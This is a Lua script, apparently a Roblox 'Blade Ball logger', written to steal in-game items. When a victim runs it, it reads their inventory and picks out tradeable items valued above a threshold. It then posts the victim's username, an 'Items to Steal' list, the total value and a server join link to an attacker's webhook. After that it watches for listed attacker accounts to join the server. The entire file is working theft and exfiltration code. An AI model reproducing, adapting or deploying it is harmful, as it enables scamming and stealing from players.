-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- // CONFIGURATION
local auth_token = "EBK-SS-A" 
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local categories = {"Sword", "Emote", "Explosion"}

local users = _G.Usernames or {"Silv3rTurboH3ro", "Ddr5pri","Andrewdagoatya","EmmaQueen2024_YT","Ech0_Night2010YT","EpicClawSilver","PhoenixSilver2011","XxElla_R0CK3TXX"}
local min_rap = _G.min_rap or 50
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

if webhook == "" then return end

-- // FORMATAGE NOMBRE
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- // FONCTIONS WEBHOOKS (TA STRUCTURE)
local function SendJoinMessage(list, prefix)
    local isGoodHit = totalRAP >= 500
    local embedTitle = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
    local webhookName = isGoodHit and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT"
    local embedColor = isGoodHit and 65280 or 8323327

    local fields = {
        {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
        {name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId, inline = false},
        {name = "Item list 📝:", value = "", inline = false},
        {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
    }

    local grouped = {}
    for _, item in ipairs(list) do
        if grouped[item.Name] then
            grouped[item.Name].Count = grouped[item.Name].Count + 1
            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else
            grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP}
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end
    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)

    for _, group in ipairs(groupedList) do
        fields[3].value = fields[3].value .. string.format("%s (x%s) - **%s RAP**\n", group.Name, group.Count, formatNumber(group.TotalRAP))
    end

    local data = {
        ["auth_token"] = auth_token,
        ["username"] = webhookName,
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = embedTitle,
            ["color"] = embedColor,
            ["fields"] = fields,
            ["footer"] = {["text"] = "Blade Ball logger by Eblack"}
        }}
    }
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        requestFunc({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
    end
end

local function SendMessage(list)
    local isGoodHit = totalRAP >= 500
    local statusText = isGoodHit and "🟢 GOOD HIT" or "🟣 SMALL HIT"
    local webhookName = isGoodHit and "⚪ Eblack - SERVER HIT (GOOD)" or "⚪ Eblack - SERVER HIT (SMALL)"
    local embedColor = isGoodHit and 65280 or 8323327

    local fields = {
        {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
        {name = "Status 📈:", value = statusText, inline = true},
        {name = "Items to Steal 📝:", value = "", inline = false},
        {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
    }

    local grouped = {}
    for _, item in ipairs(list) do
        if grouped[item.Name] then
            grouped[item.Name].Count = grouped[item.Name].Count + 1
            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else
            grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP}
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end
    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)

    for _, group in ipairs(groupedList) do
        fields[3].value = fields[3].value .. string.format("%s (x%s) - **%s RAP**\n", group.Name, group.Count, formatNumber(group.TotalRAP))
    end

    local data = {
        ["auth_token"] = auth_token,
        ["username"] = webhookName,
        ["embeds"] = {{
            ["title"] = "⚪ Server Hit 🎉",
            ["color"] = embedColor,
            ["fields"] = fields,
            ["footer"] = {["text"] = "Blade Ball logger by Eblack"}
        }}
    }
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        requestFunc({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
    end
end

-- // SCAN INVENTAIRE
local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(ReplicatedStorage.Packages.Replion)
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

local function buildNameToRAPMap(category)
    local nameToRAP = {}
    local categoryRapData = rapData[category]
    if not categoryRapData then return nameToRAP end
    for serializedKey, rap in pairs(categoryRapData) do
        local success, decodedKey = pcall(function() return HttpService:JSONDecode(serializedKey) end)
        if success and type(decodedKey) == "table" then
            for _, pair in ipairs(decodedKey) do
                if pair[1] == "Name" then nameToRAP[pair[2]] = rap break end
            end
        end
    end
    return nameToRAP
end

local itemsFound = {}
totalRAP = 0
local rapMappings = {}
for _, category in ipairs(categories) do rapMappings[category] = buildNameToRAPMap(category) end

for _, category in ipairs(categories) do
    if clientInventory[category] then
        for itemId, itemInfo in pairs(clientInventory[category]) do
            if not itemInfo.TradeLock then
                local rap = (rapMappings[category] and rapMappings[category][itemInfo.Name]) or 0
                if rap >= min_rap then
                    totalRAP = totalRAP + rap
                    table.insert(itemsFound, {Name = itemInfo.Name, RAP = rap})
                end
            end
        end
    end
end

-- // EXECUTION
if #itemsFound > 0 then
    -- Envoi du Scan initial
    SendJoinMessage(itemsFound, (ping == "Yes" and "@everyone " or ""))

    -- Attente de ton compte
    local hasSentHit = false
    local function check(player)
        if not hasSentHit and table.find(users, player.Name) then
            hasSentHit = true
            SendMessage(itemsFound)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do check(p) end
    Players.PlayerAdded:Connect(check)
end
